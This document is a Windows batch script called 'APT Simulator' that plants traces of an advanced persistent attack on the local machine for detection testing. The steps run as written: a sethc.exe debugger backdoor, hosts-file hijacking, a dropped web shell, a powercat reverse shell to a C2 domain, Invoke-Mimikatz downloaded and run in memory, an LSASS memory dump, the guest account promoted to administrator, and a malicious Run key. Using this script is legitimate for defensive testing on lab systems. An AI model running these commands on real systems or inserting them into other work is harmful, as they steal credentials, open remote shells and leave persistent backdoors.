@ECHO OFF
color 0C
ECHO. 
ECHO ===========================================================================
ECHO   APT Simulator 
ECHO   Florian Roth, v0.3 February 2018
ECHO ===========================================================================

:: Config
SET ZIP=.\helpers\7z.exe
SET CURL=.\helpers\curl.exe
SET TOOLARCH=.\enc-toolset.7z
SET FILEARCH=.\enc-files.7z
SET PASS=aptsimulator
SET APTDIR=C:\TMP
SET WWWROOT=C:\inetpub\wwwroot

ECHO.
ECHO This program is meant to simulate an APT on the local system by 
ECHO distributing traces of typical APT attacks.
ECHO. 
ECHO 1.) To get the best results, run it as "Administrator"
ECHO 2.) DO NOT run this script on PRODUCTIVE systems as it drops files
ECHO     that may be used by attackers for lateral movement, password dumping
ECHO     and other types of manipulations. 
ECHO 3.) You DO NOT have to deactivate your ANTIVIRUS. Keep it running to see 
ECHO     that it is useless to detect activities of skilled attackers.
ECHO 4.) DO NOT upload contents of this archive to VIRUSTOTAL or a similar 
ECHO     online service as they provide backend views in which researchers and 
ECHO     attackers get access to the uploaded files.
ECHO.

ECHO ===========================================================================
ECHO Let's go ahead ... The next steps will manipulate the local system.
ECHO.
setlocal
:PROMPT
SET /P AREYOUSURE=Are you sure to proceed (Y/[N])?
IF /I "%AREYOUSURE%" NEQ "Y" GOTO END

ECHO.
ECHO ===========================================================================
ECHO WORKING DIRS AND FILES
ECHO.
ECHO Creating typical attacker working directory %APTDIR% ...
ping -n 5 127.0.0.1 > NUL
MKDIR %APTDIR%
ECHO Dropping typical temporary files into that directory
ping -n 5 127.0.0.1 > NUL
%ZIP% e -bb0 -p%PASS% %FILEARCH% -aoa -o%APTDIR% workfiles\d.txt > NUL
%ZIP% e -bb0 -p%PASS% %FILEARCH% -aoa -o%APTDIR% workfiles\127.0.0.1.txt > NUL

ECHO.
ECHO ===========================================================================
ECHO RECON ACTIVITY
ECHO.
ECHO Executes commands that are often used by attackers to get information
ping -n 5 127.0.0.1 > NUL

whoami > %APTDIR%\sys.txt
systeminfo >> %APTDIR%\sys.txt
net localgroup administrators >> %APTDIR%\sys.txt
wmic qfe list full >> %APTDIR%\sys.txt
wmic share get >> %APTDIR%\sys.txt

ECHO.
ECHO ===========================================================================
ECHO DNS CACHE
ECHO.
ECHO Creating DNS Cache entries for well-known malicious C2 servers
ping -n 5 127.0.0.1 > NUL

ECHO C2: msupdater.com
nslookup msupdater.com 1> NUL
ECHO C2: twitterdocs.com
nslookup twitterdocs.com 1> NUL
ECHO C2: freenow.chickenkiller.com
nslookup freenow.chickenkiller.com 1> NUL
ECHO C2: www.googleaccountsservices.com
nslookup www.googleaccountsservices.com 1> NUL

ECHO.
ECHO ===========================================================================
ECHO EVENTLOG
ECHO.
ECHO Creating Eventlog Entries indicating the use of password dumpers
ping -n 5 127.0.0.1 > NUL

eventcreate /L System /T Success /ID 100 /D "A service was installed in the system. Service Name:  WCESERVICE Service File Name:  C:\Users\neo\AppData\Local\Temp\0c134c70-2b4d-4cb3-beed-37c5fa0451d0.exe -S Service Type:  user mode service Service Start Type:  demand start Service Account:  LocalSystem"
eventcreate /L System /T Success /ID 101 /D "The WCESERVICE service entered the running state."

ECHO.
ECHO ===========================================================================
ECHO HOSTS
ECHO.
ECHO Modifying the hosts file
ping -n 5 127.0.0.1 > NUL

ECHO Adding update.microsoft.com mapping to private IP address
ECHO 10.2.2.2	update.microsoft.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  www.virustotal.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  www.www.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  dci.sophosupd.com >> %SYSTEMROOT%\System32\drivers\etc\hosts

ECHO.
ECHO ===========================================================================
ECHO SETHC BACKDOOR
ECHO Two methods: Replacement of sethc.exe / Debugger registration
ECHO.
ECHO Backing up old sethc.exe
ping -n 5 127.0.0.1 > NUL
COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck

ECHO.
ECHO Trying to replace the real sethc.exe - administrator rights needed
ECHO Instead registering cmd.exe as debugger for sethc.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

ECHO At least place a temporary and manipulated sethc.exe in the TEMP folder
%ZIP% e -p%PASS% %FILEARCH% -aoa -o%TEMP% workfiles\sethc.exe > NUL

ECHO.
ECHO ===========================================================================
ECHO CLOAKING
ECHO.
ECHO Dropping cloaked RAR file with JPG extension
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %FILEARCH% -aoa -o%TEMP% workfiles\s01.jpg > NUL

ECHO.
ECHO ===========================================================================
ECHO WEBSHELL
ECHO.
ECHO Dropping web shell in new WWW directory
ping -n 5 127.0.0.1 > NUL

MKDIR %WWWROOT%
%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%WWWROOT% toolset\b.jsp > NUL
%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%WWWROOT% toolset\tests.jsp > NUL
%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%WWWROOT% toolset\shell.gif > NUL

ECHO.
ECHO ===========================================================================
ECHO NETCAT ALTERNATIVE
ECHO.
ECHO Dropping a Powershell netcat alternative into the APT dir
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\nc.ps1 > NUL
powershell -Exec Bypass ". %APTDIR%\nc.ps1;powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd"

ECHO.
ECHO ===========================================================================
ECHO REMOTE EXECUTION TOOL 
ECHO.
ECHO Dropping a remote execution tool into the APT dir
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\xCmd.exe > NUL

ECHO.
ECHO ===========================================================================
ECHO MIMIKATZ
ECHO.
ECHO Dropping a custom mimikatz build into the APT dir
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\mim.exe > NUL

ECHO Executing it to get it into memory & saving the output to out.tmp ...
ping -n 5 127.0.0.1 > NUL
%APTDIR%\mim.exe > out.tmp

ECHO Extracting Mimik4tz output to target directory ...
ping -n 5 127.0.0.1 > NUL
%ZIP% e -p%PASS% %FILEARCH% -aoa -o%APTDIR% toolset\mim-out.txt > NUL

ECHO Running Invoke-Mimikatz: downloading from github, run from memory 
powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> %APTDIR%\moutput.tmp

ECHO.
ECHO ===========================================================================
ECHO PSEXEC
ECHO.
ECHO Dropping a modified PsExec into the APT dir
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\p.exe > NUL

ECHO Running a cmd.exe as LOCAL_SYSTEM 
ping -n 5 127.0.0.1 > NUL
%APTDIR%\p.exe -accepteula -d -s cmd.exe /c systeminfo

ECHO.
ECHO ===========================================================================
ECHO At Job Creation
ECHO.
ECHO Registering mimikatz in At job
ping -n 5 127.0.0.1 > NUL

at 13:00 "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"

ECHO.
ECHO ===========================================================================
ECHO Backdoor Run Key
ECHO.
ECHO Registering a malicious RUN key
ping -n 5 127.0.0.1 > NUL

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateSvc /t REG_SZ /d "C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt" /f

ECHO.
ECHO ===========================================================================
ECHO Suspicious Locations
ECHO Well-known system files in suspicious locations
ECHO.
ECHO Placing a svchost.exe (which is actually srvany.exe) into %PUBLIC%
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%PUBLIC% toolset\svchost.exe > NUL

ECHO Running the misplaced system file 
ping -n 5 127.0.0.1 > NUL

%PUBLIC%\svchost.exe

ECHO.
ECHO ===========================================================================
ECHO GUEST USER
ECHO.
ECHO Activating guest user account
ping -n 5 127.0.0.1 > NUL

net user guest /active:yes

ECHO Adding the guest user to the local administrators group
ping -n 5 127.0.0.1 > NUL

net localgroup administrators guest /ADD

ECHO.
ECHO ===========================================================================
ECHO LSASS DUMP
ECHO.
ECHO Dumping LSASS memory with ProcDump
ping -n 5 127.0.0.1 > NUL

%ZIP% e -p%PASS% %TOOLARCH% -aoa -o%PUBLIC% toolset\procdump64.exe > NUL

%PUBLIC%\procdump64.exe -accepteula -ma lsass.exe %APTDIR%\somethingwindows.dmp 2>&1

ECHO.
ECHO ===========================================================================
ECHO C2 Access
ECHO.
ECHO Using curl to access well-known C2 addresses
ping -n 5 127.0.0.1 > NUL

ECHO C2: msupdater.com
%CURL% -s -o /dev/null -I -w "%{http_code}" msupdater.com
ECHO C2: twitterdocs.com
%CURL% -s -o /dev/null -I -w "%{http_code}" twitterdocs.com
ECHO C2: freenow.chickenkiller.com
%CURL% -s -o /dev/null -I -w "%{http_code}" freenow.chickenkiller.com
ECHO C2: www.googleaccountsservices.com
%CURL% -s -o /dev/null -I -w "%{http_code}" www.googleaccountsservices.com

ECHO.
ECHO ===========================================================================
ECHO MALICIOUS UA
ECHO.
ECHO Using malicious user agents to access web sites
ping -n 5 127.0.0.1 > NUL

ECHO HttpBrowser RAT
%CURL% -s -o /dev/null -I -w "%{http_code}" -A "HttpBrowser/1.0" www.google.com
ECHO Dyre / Upatre
%CURL% -s -o /dev/null -I -w "%{http_code}" -A "Wget/1.9+cvs-stable (Red Hat modified)" www.google.com
ECHO Sality
%CURL% -s -o /dev/null -I -w "%{http_code}" -A "Opera/8.81 (Windows NT 6.0; U; en)" www.google.com
ECHO NJRat
%CURL% -s -o /dev/null -I -w "%{http_code}" -A "*<|>*" www.google.com

:END
ECHO.
ECHO ===========================================================================
ECHO Finished!
ECHO Check for errors and make sure you opened the command line as 'Administrator'
ECHO.
pause
color 07
endlocal